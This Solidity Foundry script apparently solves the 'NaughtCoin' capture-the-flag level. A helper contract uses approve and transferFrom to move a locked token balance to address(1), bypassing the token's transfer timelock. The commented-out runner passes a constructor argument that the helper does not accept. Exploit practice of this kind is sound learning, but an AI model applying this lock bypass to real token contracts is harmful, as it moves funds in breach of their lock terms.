// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Naughtcoin.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract mySpender {
    NaughtCoin ncoin = NaughtCoin(0x53Daf74052Fd0b392e11e2F0dF7f2B440D68eeA6);
    uint256 amount_to_spend = 1000000000000000000000000;

    function spend() external {
        ncoin.transferFrom(msg.sender, address(1), amount_to_spend);
    }
}

/*contract NaughtCoinSolution is Script {
    NaughtCoin ncoin = new NaughtCoin(address(this));
    mySpender spender = new mySpender(ncoin);

    function run() external {
        console.log(ncoin.balanceOf(address(this)));
        ncoin.approve(address(spender), 1000000000000000000000000);
        console.log(ncoin.allowance(address(this), address(spender)));
        spender.spend();
        console.log(ncoin.balanceOf(tx.origin));
    }
}*/
